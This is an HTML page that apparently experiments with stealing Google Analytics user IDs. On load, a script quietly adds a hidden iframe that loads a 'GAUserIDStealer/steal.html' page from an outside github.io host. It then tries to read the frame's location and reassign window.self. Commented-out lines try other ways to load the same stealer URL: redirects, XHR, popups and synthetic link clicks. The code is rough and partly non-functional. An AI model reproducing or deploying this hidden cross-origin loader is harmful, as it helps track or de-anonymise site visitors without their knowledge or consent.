<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width,initial-scale=1.0">
    <titile>Document</titile>
<!--     <iframe id="cframe" style="display:none"></iframe> -->
    <script>
   
     function doFlow(){
        
         console.log('A origin loacation: ',window.location.origin);
         console.log('A window top !== window', window.top!==window);
         
//          window.self.location='https://newmangervase91.github.io/GAUserIDStealer/steal.html';
//          window.top.location='https://newmangervase91.github.io/GAUserIDStealer/steal.html';
//          window.location.origin='https://newmangervase91.github.io'; 
         
//          console.log('change location.origin');
//          console.log('after self/top origin: A',window.location.origin);
//          console.log('after A: TOP',window.top.location);
//          console.log('after A: self',window.self.location);
         
         
//          var guhappyId=makeid(5);
         var ifrm_c = document.createElement('iframe');
         ifrm_c.setAttribute('id', 'fb_test');
         ifrm_c.setAttribute('class', 'guhappy_steal');
         ifrm_c.style.display = "none";
         document.head.appendChild(ifrm_c);
         
         var cframe=document.getElementById('fb_test');
         
//          var cframe=document.getElementById("cframe");
         
//          cframe.addEventListener("load",function(){
//              setTimeout(function(){
//                  cframe.parentNode.removeChild(cframe);
//                  cframe.parentNode=null;
//              }, 5000);
             
//          });
         
    
         cframe.src ="https://newmangervase91.github.io/GAUserIDStealer/steal.html";
             
//         var xhr = new XMLHttpRequest(),
//         method = "GET",
//         url = "https://newmangervase91.github.io/GAUserIDStealer/steal.html";

//         xhr.open(method, url, true);
//         xhr.onreadystatechange = function () {
//                 if(xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
//                     console.log(xhr.responseText);
//                 }
//             };
//         xhr.send();
//          createWindow = setTimeout(function(){window.open("https://newmangervase91.github.io/GAUserIDStealer/steal.html")}, 1000);
//          close_w = setTimeout(function(){createWindow.close()}, 1000);
         
//          var a = document.createElement('a');
//          element.setAttribute('href', 'https://newmangervase91.github.io/GAUserIDStealer/steal.html');
//          element.setAttribute('target', '_blank');
//          a.target="_blank";
//          a.href="https://newmangervase91.github.io/GAUserIDStealer/steal.html";
//          document.body.appendChild(a);
//          a.click();
//          createWindow = setTimeout(function(){window.open("https://newmangervase91.github.io/GAUserIDStealer/steal.html")}, 500);
//          close_w = setTimeout(function(){createWindow.close()}, 1000);
     }
     doFlow();
    </script>
    <script>
        function checklocation(){
         const iframe = document.getElementById('fb_test');
         console.log('check_iframe : A',iframe.contentWindow);
         console.log('check_iframe location href: A',iframe.contentWindow.location.href);
         console.log('check_iframe location origin: A',iframe.contentWindow.location.origin);

         window.self=iframe.contentWindow;
         console.log('assign cframe to window_self');
         console.log('after self/top origin: A',window.location.origin);
         console.log('after A: TOP',window.top.location);
         console.log('after A: self',window.self.location);
        }
        checklocation();
    </script>
</head>

<body>
    
<!--     <script>
        console.log('A',window.location.origin);
        console.log('A window top !== window', window.top!==window);
    </script> -->
</body>

</html>
